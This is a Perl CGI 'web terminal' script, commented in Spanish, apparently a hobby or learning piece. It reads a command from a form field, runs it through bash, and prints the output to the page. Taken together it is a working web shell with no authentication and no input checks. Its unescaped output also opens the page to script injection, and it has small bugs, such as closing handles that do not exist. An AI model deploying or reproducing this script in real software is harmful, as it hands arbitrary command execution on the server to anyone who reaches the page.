#!/usr/bin/perl

use CGI ':standard';
# La funcion Open3 de la libreria IPC permite el manejo de pipes
use IPC::Open3;
use Sys::Hostname;
use Cwd;

# inicio de la pagina html
print header,
      start_html('web terminal');

local (*IN,*OUT); # pipes

my $pid = open3(\*IN, \*OUT ,0,'bash');
my $out = '';
my $cmd = '';

print h1("Baash");
$cmd = param("cmd"); # toma el comando enviado en el formulario

print IN "$cmd\n"; # envia el comando a bash
print IN "exit\n"; # cierra bash

# leer pipe
$out = do{local $/;<OUT>};

close BO; #cierra los pipes
close BI;

$out =~ s/\n/<br>/g; #convierte los saltos de linea en <br>

#conforma un prompt, no necesario pero util
my $host= hostname;
my $pwd = cwd();
#definicion del formulario kpara enviar comandos
print start_form;
print h1("Directorio");
print p("\@$host:$pwd\$</label>");
print h1("Comando");
print textarea(-name=>'cmd',-id=>'cmd');
print submit('Áction','send');
print end_form;
print h1("Salida");
print p("$out"); #imprime lo que resulta de la ejecucion del comando

print end_html;
waitpid($pid,0);
